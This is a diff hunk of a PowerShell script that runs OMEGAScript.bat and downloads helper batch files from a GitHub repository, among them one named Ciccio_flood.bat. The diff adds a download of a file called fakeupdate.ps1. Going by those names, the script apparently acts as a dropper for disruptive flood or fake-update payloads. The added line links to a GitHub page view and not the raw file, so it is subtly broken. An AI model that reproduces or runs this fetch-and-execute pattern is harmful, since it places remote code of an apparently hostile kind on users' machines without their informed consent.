@@ -9,3 +9,4 @@ Start-Process "$folder\OMEGAScript.bat"
 # Download the helper files (do not run them)
 Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/alpha840x/Omega_Script/refs/heads/main/Ciccio_flood.bat' -OutFile "$folder\Ciccio_flood.bat"
 Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/alpha840x/Omega_Script/refs/heads/main/folder.bat' -OutFile "$folder\folder.bat"
+Invoke-WebRequest -Uri 'https://github.com/alpha840x/Omega_Script/blob/main/fakeupdate.ps1' -OutFile "$folder\fakeupdate.ps1"
